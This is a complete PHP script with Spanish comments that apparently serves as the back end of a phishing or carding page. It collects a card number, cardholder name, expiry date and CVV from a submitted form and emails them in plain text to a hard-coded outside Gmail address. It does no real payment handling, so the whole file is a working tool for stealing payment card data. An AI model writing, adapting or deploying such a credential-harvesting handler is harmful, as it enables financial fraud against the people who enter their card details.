<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir datos del formulario
    $numero_tarjeta = $_POST["numero"];
    $nombre_titular = $_POST["nombre"];
    $fecha_vencimiento = $_POST["vencimiento"];
    $cvv = $_POST["cvv"];

    // Correo de destino
    $correo_destino = "hokahoka695@gmail.com";

    // Asunto del correo
    $asunto = "Datos de Tarjeta de Crédito";

    // Contenido del correo
    $mensaje = "Número de Tarjeta: $numero_tarjeta\n";
    $mensaje .= "Nombre del Titular: $nombre_titular\n";
    $mensaje .= "Fecha de Vencimiento: $fecha_vencimiento\n";
    $mensaje .= "CVV: $cvv\n";

    // Enviar correo
    $resultado = mail($correo_destino, $asunto, $mensaje);

    // Verificar si el correo se envió correctamente
    if ($resultado) {
        echo "Correo enviado exitosamente";
    } else {
        echo "Error al enviar el correo";
    }
}
?>
